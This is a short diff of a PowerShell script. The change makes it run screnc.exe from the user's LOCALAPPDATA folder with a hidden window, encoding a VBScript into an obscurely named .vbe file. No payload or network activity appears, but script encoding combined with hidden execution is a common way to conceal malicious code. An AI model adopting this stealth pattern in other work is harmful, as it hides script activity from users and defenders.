@@ -127,5 +127,12 @@ catch {
 $screncPath = Join-Path $env:LOCALAPPDATA "screnc.exe"
 $outputVbePath = Join-Path $env:LOCALAPPDATA "1446062403_house.vbe"
 if (Test-Path $screncPath) {
-    & $screncPath /s /f /tp=v /e=vbs /op=s /ret=15 $outputPath $outputVbePath
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = $screncPath
+    $psi.Arguments = "/s /f /tp=v /e=vbs /op=s /ret=15 `"$outputPath`" `"$outputVbePath`""
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.CreateNoWindow = $true
+    $psi.UseShellExecute = $false
+    $process = [System.Diagnostics.Process]::Start($psi)
+    $process.WaitForExit()
 }
